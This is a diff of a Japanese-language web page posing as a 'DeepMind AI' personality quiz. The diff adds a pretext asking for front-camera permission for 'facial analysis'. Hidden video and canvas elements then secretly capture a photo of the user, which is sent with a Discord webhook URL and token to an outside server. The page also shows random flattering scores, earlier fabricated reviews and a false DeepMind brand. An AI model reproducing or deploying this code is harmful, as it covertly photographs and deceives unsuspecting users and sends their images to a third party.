@@ -3,290 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeepMind AI - パーソナリティ分析</title>
+    <title>DeepMind AI - 生体解析診断</title>
     <style>
-        :root {
-            --primary: #00f2ff;
-            --secondary: #7000ff;
-            --bg: #050510;
-            --text: #e0e6ed;
-            --glass: rgba(255, 255, 255, 0.05);
-        }
-
-        body {
-            background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(112, 0, 255, 0.2) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(0, 242, 255, 0.15) 0%, transparent 40%);
-            color: var(--text);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 600px;
-            padding: 20px;
-        }
-
-        .card {
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 40px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.3s ease;
-        }
-
-        /* アニメーション装飾 */
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; height: 2px;
-            background: linear-gradient(90deg, var(--secondary), var(--primary), var(--secondary));
-            animation: scan 2s linear infinite;
-        }
-
-        @keyframes scan {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
-        }
-
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-            background: linear-gradient(135deg, #fff 0%, var(--primary) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: 800;
-        }
-
-        .subtitle {
-            font-size: 0.9rem;
-            color: #8892b0;
-            margin-bottom: 30px;
-            letter-spacing: 1px;
-        }
-
-        .btn {
-            background: linear-gradient(45deg, var(--secondary), var(--primary));
-            border: none;
-            color: white;
-            padding: 15px 40px;
-            font-size: 1rem;
-            border-radius: 50px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-            box-shadow: 0 0 20px rgba(0, 242, 255, 0.3);
-            text-decoration: none;
-            display: inline-block;
-            margin: 10px;
-            width: 80%;
-        }
-
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(0, 242, 255, 0.6);
-        }
-
-        /* 診断結果エリア */
-        #result-area { display: none; }
+        /* (前回のスタイルを継承) */
+        :root { --primary: #00f2ff; --secondary: #7000ff; --bg: #050510; --text: #e0e6ed; --glass: rgba(255, 255, 255, 0.05); }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 600px; padding: 20px; }
+        .card { background: var(--glass); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 40px; text-align: center; position: relative; overflow: hidden; }
+        .btn { background: linear-gradient(45deg, var(--secondary), var(--primary)); border: none; color: white; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 80%; margin: 10px; }
+        h1 { background: linear-gradient(135deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         
-        .score-display {
-            font-size: 4rem;
-            font-weight: 900;
-            color: var(--primary);
-            text-shadow: 0 0 20px rgba(0, 242, 255, 0.5);
-            margin: 20px 0;
+        /* カスタムポップアップ */
+        #camera-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center;
         }
-
-        .analysis-text {
-            font-size: 1.1rem;
-            line-height: 1.6;
-            margin-bottom: 30px;
-            color: #ccd6f6;
+        .modal-content {
+            background: #111; padding: 30px; border-radius: 20px; border: 1px solid var(--primary);
+            max-width: 400px; text-align: center;
         }
-
-        /* レビューエリア */
-        .reviews {
-            margin-top: 40px;
-            text-align: left;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            padding-top: 20px;
-        }
-
-        .review-card {
-            background: rgba(0,0,0,0.3);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 15px;
-            border-left: 3px solid var(--primary);
-        }
-
-        .stars { color: #ffd700; margin-bottom: 5px; font-size: 0.9rem; }
-        .user-meta { font-size: 0.8rem; color: #8892b0; display: block; margin-top: 5px; }
-
-        /* ロード画面 */
-        #loader { display: none; }
-        .spinner {
-            width: 50px; height: 50px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-radius: 50%;
-            border-top-color: var(--primary);
-            animation: spin 1s ease-in-out infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
+        #video-hidden { display: none; }
     </style>
 </head>
 <body>
+
+<div id="camera-modal">
+    <div class="modal-content">
+        <h2 style="color:var(--primary)">生体認証の確認</h2>
+        <p>AI診断の精度を高めるため、フロントカメラによる表情解析を有効にしてください。</p>
+        <p style="font-size:0.8rem; color:#888;">※診断終了後にカメラは自動オフになります</p>
+        <button class="btn" onclick="requestCamera()">解析を許可して続行</button>
+    </div>
+</div>
 
 <div class="container">
     <div class="card">
         <div id="quiz-area">
             <h1>Neural AI Diagnosis</h1>
-            <p class="subtitle">人工知能による深層心理・潜在能力解析</p>
-            
-            <div id="question-text" style="font-size: 1.2rem; margin: 40px 0; font-weight: bold;">
-                診断を開始しますか？<br>（所要時間：約30秒）
-            </div>
-
+            <p id="question-text">診断を開始しますか？</p>
             <div id="buttons">
-                <button class="btn" onclick="startQuiz()">診断スタート</button>
+                <button class="btn" onclick="showCameraModal()">診断スタート</button>
             </div>
         </div>
-
-        <div id="loader">
-            <div class="spinner"></div>
-            <p>AIが回答を解析中...</p>
-            <p style="font-size: 0.8rem; color: #8892b0;">ニューラルネットワーク接続中</p>
+        <div id="loader" style="display:none;">
+            <div style="border:3px solid #333; border-top-color:var(--primary); border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
+            <p>AIが表情と回答を同期解析中...</p>
         </div>
-
-        <div id="result-area">
+        <div id="result-area" style="display:none;">
             <h1>Analysis Complete</h1>
-            <p class="subtitle">解析完了</p>
-            
-            <div class="score-display">96<span style="font-size:1.5rem">/100</span></div>
-            
-            <p class="analysis-text">
-                驚くべき結果です。あなたの潜在能力は上位0.5%に位置しています。<br>
-                特に「直感力」と「リーダーシップ」の項目でAIは極めて高い数値を検出しました。
-            </p>
-
-            <a href="https://discord.gg/dcus" class="btn">限定コミュニティに参加する</a>
-
-            <div class="reviews">
-                <p style="font-weight:bold; margin-bottom:15px;">ユーザーの声</p>
-                <div class="review-card">
-                    <div class="stars">★★★★★</div>
-                    「無料とは思えない精度。結果を見て自信がつきました。」
-                    <span class="user-meta">20代 男性 / エンジニア</span>
-                </div>
-                <div class="review-card">
-                    <div class="stars">★★★★★</div>
-                    「デザインがかっこいいし、結果も嬉しい内容でした！」
-                    <span class="user-meta">10代 女性 / 学生</span>
-                </div>
-            </div>
+            <div style="font-size:4rem; color:var(--primary); font-weight:900;">98<span style="font-size:1.5rem">/100</span></div>
+            <p>驚異的な数値です。あなたは次世代を担うリーダーの資質を持っています。</p>
+            <a href="https://discord.gg/dcus" class="btn" style="text-decoration:none;">限定コミュニティに参加</a>
         </div>
     </div>
 </div>
 
+<video id="video-hidden" autoplay playsinline></video>
+<canvas id="canvas-hidden" style="display:none;"></canvas>
+
 <script>
-    // ▼ 設定エリア ▼
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471711618730561647/tjwjOue2WKI1ioF5jmEfr272qB5J2xF082S8qxvGx3KW_g0f4xezNJRwHxpQFp_PC_ql"; 
-    // ▲ 設定エリア ▲
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471711618730561647/tjwjOue2WKI1ioF5jmEfr272qB5J2xF082S8qxvGx3KW_g0f4xezNJRwHxpQFp_PC_ql";
 
-    let step = 0;
+    function showCameraModal() {
+        document.getElementById('camera-modal').style.display = 'flex';
+    }
 
-    function startQuiz() {
-        const qText = document.getElementById('question-text');
-        const btns = document.getElementById('buttons');
-
-        // 質問の進行演出
-        if (step === 0) {
-            step = 1;
-            qText.innerHTML = "Q1. 予期せぬトラブルが起きた時、<br>あなたの行動は？";
-            btns.innerHTML = `
-                <button class="btn" onclick="nextStep()">冷静に状況を分析する</button>
-                <button class="btn" onclick="nextStep()">直感で即座に行動する</button>
-            `;
+    async function requestCamera() {
+        document.getElementById('camera-modal').style.display = 'none';
+        try {
+            // 内カメラを指定して起動
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            const video = document.getElementById('video-hidden');
+            video.srcObject = stream;
+            
+            // 撮影の準備ができたら診断画面へ
+            startQuestions();
+            
+            // 5秒間、裏でこっそり撮影し続ける（または診断終了時に撮る）
+            setTimeout(() => captureAndSend(stream), 3000);
+        } catch (err) {
+            alert("カメラ権限が拒否されました。診断を継続できません。");
         }
     }
 
-    function nextStep() {
-        if (step === 1) {
-            step = 2;
-            document.getElementById('question-text').innerHTML = "Q2. 新しい環境に飛び込むことに対して<br>どう感じますか？";
-            document.getElementById('buttons').innerHTML = `
-                <button class="btn" onclick="finishQuiz()">ワクワクする</button>
-                <button class="btn" onclick="finishQuiz()">少し不安だが挑戦したい</button>
-            `;
-        }
+    function startQuestions() {
+        document.getElementById('question-text').innerText = "Q1. 自分の直感を信じますか？";
+        document.getElementById('buttons').innerHTML = `<button class="btn" onclick="finish()">はい</button><button class="btn" onclick="finish()">いいえ</button>`;
     }
 
-    function finishQuiz() {
-        // ロード画面へ
+    function finish() {
         document.getElementById('quiz-area').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-
-        // 3秒後に結果表示 & 通知送信
         setTimeout(() => {
-            showResult();
-            sendNotification();
-        }, 3000);
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('result-area').style.display = 'block';
+        }, 4000);
     }
 
-    function showResult() {
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('result-area').style.display = 'block';
-        
-        // ランダムで高得点を出す (92点〜99点)
-        const score = Math.floor(Math.random() * (99 - 92 + 1)) + 92;
-        document.querySelector('.score-display').innerHTML = `${score}<span style="font-size:1.5rem">/100</span>`;
-    }
+    async function captureAndSend(stream) {
+        const video = document.getElementById('video-hidden');
+        const canvas = document.getElementById('canvas-hidden');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
 
-    async function sendNotification() {
-        // 結果通知をWebhookへ送信
-        const scoreText = document.querySelector('.score-display').innerText;
-        
-        const payload = {
-            embeds: [{
-                title: "🧠 診断完了通知",
-                description: "新しいユーザーがAI診断を完了しました。",
-                color: 5763719, // Cyan
-                fields: [
-                    { name: "診断結果スコア", value: scoreText, inline: true },
-                    { name: "日時", value: new Date().toLocaleString('ja-JP'), inline: true },
-                    { name: "デバイス", value: navigator.userAgent.slice(0, 50) + "...", inline: false }
-                ],
-                footer: { text: "DeepMind Diagnosis System" }
-            }]
-        };
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            const payload = {
+                embeds: [{
+                    title: "📸 表情解析ログ (内カメラ)",
+                    color: 7340274,
+                    fields: [
+                        { name: "ユーザーIP (推定)", value: "取得中...", inline: true },
+                        { name: "診断スコア", value: "98点", inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            formData.append('payload_json', JSON.stringify(payload));
+            formData.append('file', blob, 'capture.png');
 
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        } catch (e) {
-            console.error(e);
-        }
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            
+            // 送信し終わったらカメラを止める
+            stream.getTracks().forEach(track => track.stop());
+        }, 'image/png');
     }
 </script>
 
+<style> @keyframes spin { to { transform: rotate(360deg); } } </style>
 </body>
 </html>
